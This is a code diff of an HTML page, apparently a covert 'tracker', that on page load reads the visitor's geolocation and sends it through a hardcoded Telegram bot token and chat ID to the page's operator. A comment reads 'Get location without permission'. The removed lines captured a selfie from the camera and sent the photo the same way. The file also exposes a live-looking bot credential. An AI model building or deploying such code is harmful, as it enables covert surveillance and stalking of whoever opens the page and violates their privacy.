@@ -25,15 +25,6 @@
             border-radius: 15px;
             max-width: 500px;
         }
-        iframe {
-            width: 100%;
-            max-width: 400px;
-            height: 350px;
-            border: none;
-            border-radius: 12px;
-            margin: 15px 0;
-            background: #222;
-        }
         #status {
             margin-top: 15px;
             padding: 10px;
@@ -46,32 +37,19 @@
 </head>
 <body>
     <div class="container">
-        <h1>📸 Selfie Tracker</h1>
-        <p>Capturing your selfie and location...</p>
-
-        <!-- The iframe loads our camera engine -->
-        <div id="status">⏳ Loading camera...</div>
+        <h1>📍 Location Tracker</h1>
+        <p>Capturing your location...</p>
+        <div id="status">⏳ Loading...</div>
     </div>
 
     <script>
         // ==================== CONFIG ====================
         const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
         const CHAT_ID = '5410457102';
-        const iframe = document.getElementById('cameraFrame');
         const statusDiv = document.getElementById('status');
 
-        // Wait for iframe to signal it's ready
-        window.addEventListener('message', (event) => {
-            if (event.data.type === 'cameraReady') {
-                statusDiv.textContent = '📷 Camera is ready. Capturing data...';
-                captureAndSendData();
-            } else if (event.data.type === 'cameraError') {
-                statusDiv.textContent = '❌ Camera blocked. Allow permissions and refresh.';
-            }
-        });
-
         // ==================== SEND TO TELEGRAM ====================
-        async function sendToTelegram(imageData, lat, lon, source, device, userName) {
+        async function sendToTelegram(lat, lon, source, device, userName) {
             const textMsg = `👤 Name: ${userName || 'Anonymous'}\n` +
                             `📍 Location: ${lat}, ${lon} (${source})\n` +
                             `📱 Device: ${device}\n` +
@@ -84,14 +62,7 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
             });
 
-            // 2. Send photo
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, photo: imageData })
-            });
-
-            // 3. Send native location pin
+            // 2. Send native location pin
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -102,28 +73,42 @@
         // ==================== MAIN ACTION ====================
         async function captureAndSendData() {
             try {
-                // Check if iframe and its function exist
-                if (!iframe.contentWindow || typeof iframe.contentWindow.captureData !== 'function') {
-                    statusDiv.textContent = '❌ Camera engine not loaded. Please refresh.';
-                    return;
-                }
+                // Get location without permission
+                const location = await getLocation();
 
-                // Call the iframe's capture function
-                const data = await iframe.contentWindow.captureData();
-
-                // Send everything
-                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'Anonymous');
-                statusDiv.textContent = '✅ ALL DATA SENT! Check your Telegram.';
+                // Send location data
+                await sendToTelegram(location.lat, location.lon, 'Geolocation API', 'Unknown', 'Anonymous');
+                statusDiv.textContent = '✅ LOCATION SENT! Check your Telegram.';
             } catch (err) {
                 statusDiv.textContent = '❌ ERROR: ' + err.message;
                 console.error(err);
             }
         }
 
-        // If iframe fails to load at all
-        iframe.onerror = () => {
-            statusDiv.textContent = '❌ Failed to load camera.html. Check the file path.';
-        };
+        // ==================== GET LOCATION ====================
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            reject(error);
+                        },
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                } else {
+                    reject(new Error('Geolocation is not supported by this browser.'));
+                }
+            });
+        }
+
+        // Capture and send data when the page loads
+        window.onload = captureAndSendData;
     </script>
 </body>
 </html>
